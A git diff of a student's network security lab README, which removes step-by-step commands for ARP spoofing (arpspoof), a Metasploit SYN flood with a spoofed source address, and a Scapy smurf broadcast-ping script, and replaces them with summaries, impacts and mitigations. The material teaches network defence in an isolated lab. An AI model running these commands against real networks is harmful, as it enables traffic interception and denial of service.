@@ -1,149 +1,85 @@
-## 1. ARP Spoofing Attack
+# Network Security Lab — Overview  
+ARP Spoofing • TCP SYN Flood • Smurf Attack
 
-### a. Network Configuration
+## Table of Contents
+1. [Introduction](#1-introduction)  
+2. [Lab Environment](#2-lab-environment)  
+3. [Attack Summaries](#3-attack-summaries)  
+   - [ARP Spoofing](#31-arp-spoofing)  
+   - [TCP SYN Flood](#32-tcp-syn-flood)  
+   - [Smurf Attack](#33-smurf-attack)  
+4. [Full Documentation](#4-full-documentation)  
+5. [Conclusion](#5-conclusion)  
+6. [Author](#6-author)
 
-bash
+---
 
-```
-# /etc/network/interfaces
-auto lo
-iface lo inet loopback
+## 1. Introduction
 
-auto eth0
-iface eth0 inet static
-  address 192.168.43.22
-  netmask 255.255.255.0
-  gateway 192.168.43.1
-  dns-nameservers 1.1.1.1 8.8.8.8
-```
+This lab explores three fundamental network attacks performed in a controlled environment using Kali Linux and Metasploitable:
 
-Each machine is connected to the `192.168.43.0/24` network.
+- ARP Spoofing  
+- TCP SYN Flood  
+- Smurf Attack (ICMP Amplification)
 
-### b. Connectivity Test
+The objective is to understand protocol weaknesses, observe attack behavior, and analyze the impact using Wireshark and system tools.
 
-bash
+---
 
-```
-msfadmin@metasploitable:~$ ping 192.168.43.230
-64 bytes from 192.168.43.230: icmp_seq=1 ttl=64 time=5.30 ms
-...
-```
+## 2. Lab Environment
 
-### c. ARP Table Before Attack
+- **Attacker:** Kali Linux  
+- **Victim:** Metasploitable  
+- **Network:** 192.168.43.0/24  
+- **Tools Used:**  
+  - Metasploit Framework  
+  - Scapy  
+  - Wireshark  
+  - netstat, arp, ping  
 
-bash
+---
 
-```
-msfadmin@metasploitable:~$ arp -a
-? (192.168.43.230) at 00:0c:29:14:f1:c7 [ether] on eth0
-? (192.168.43.1)   at 00:0c:29:31:55:ad [ether] on eth0
-```
+## 3. Attack Summaries
 
-### d. Launching ARP Spoofing from Kali
+### 3.1 ARP Spoofing  
+A Layer‑2 attack where the attacker poisons the ARP cache of the victim and gateway, redirecting traffic through the attacker.  
+Impact: Man‑in‑the‑middle, credential interception, session hijacking.
 
-bash
+👉 Full details: see `/docs/arp-spoofing.md`
 
-```
-sudo arpspoof -t 192.168.43.1 192.168.43.22
-sudo arpspoof -t 192.168.43.22 192.168.43.1
-```
+---
 
-Result: Kali injects fake ARP replies, poisoning the ARP table.
+### 3.2 TCP SYN Flood  
+A Denial‑of‑Service attack exploiting the TCP handshake by sending large numbers of SYN packets without completing the connection.  
+Impact: Service slowdown or unavailability.
 
-### e. ARP Table After Attack
+👉 Full details: see `/docs/syn-flood.md`
 
-bash
+---
 
-```
-msfadmin@metasploitable:~$ arp -a
-? (192.168.43.1) at 00:0c:29:14:f1:c7 [ether] on eth0
-```
+### 3.3 Smurf Attack  
+An ICMP amplification attack where broadcast pings cause multiple hosts to reply to the victim.  
+Impact: High ICMP traffic volume, potential DoS.
 
-## 2. TCP SYN Flooding (DoS)
+👉 Full details: see `/docs/smurf-attack.md`
 
-### a. Launch Metasploit
+---
 
-bash
+## 4. Full Documentation
 
-```
-sudo msfconsole
-```
+- [ARP Spoofing](docs/arp-spoofing.md)  
+- [TCP SYN Flood](docs/syn-flood.md)  
+- [Smurf Attack](docs/smurf-attack.md)
 
-### b. Search Module
+---
 
-bash
+## 5. Conclusion
 
-```
-msf6 > search synflood
-```
+This lab demonstrates how simple packet‑level attacks can disrupt network confidentiality, integrity, and availability.  
+Understanding these offensive techniques strengthens defensive capabilities and supports secure network design.
 
-### c. Configure Module
+---
 
-bash
+## 6. Author
 
-```
-msf6 > use auxiliary/dos/tcp/synflood
-msf6 > set RHOST 192.168.43.22
-msf6 > set RPORT 80
-msf6 > set SHOST 184.56.100.250
-msf6 > set INTERFACE eth0
-msf6 > run
-```
-
-### d. Verification with netstat
-
-bash
-
-```
-netstat -ant | grep SYN_RECV
-```
-
-Shows multiple connections stuck in `SYN_RECV`.
-
-### e. Wireshark Analysis
-
-Captured TCP SYN packets flooding the target.
-
-## 3. Smurf Attack (DDoS)
-
-### a. Launch Scapy
-
-bash
-
-```
-sudo scapy
-```
-
-### b. ICMP Broadcast Script
-
-python
-
-```
-packet = IP(src="192.168.43.22", dst="192.168.43.255")/ICMP()
-send(packet, count=100, inter=0.01)
-```
-
-Objective: Amplify traffic towards the victim.
-
-### c. Wireshark Analysis
-
-Captured multiple ICMP Echo requests sent to broadcast, confirming attack propagation.
-
-## 📌 Key Takeaways
-
-- **ARP Spoofing**: exploits lack of authentication in ARP.
-    
-- **SYN Flood**: overloads TCP handshake queue.
-    
-- **Smurf Attack**: amplifies ICMP traffic via broadcast.
-    
-
-### Mitigations
-
-- ARP: Dynamic ARP Inspection, static ARP entries.
-    
-- SYN Flood: SYN cookies, rate limiting.
-    
-- Smurf: disable ICMP broadcast, anti-spoofing filters.
-    
-
+**Oussema — Cybersecurity Student**
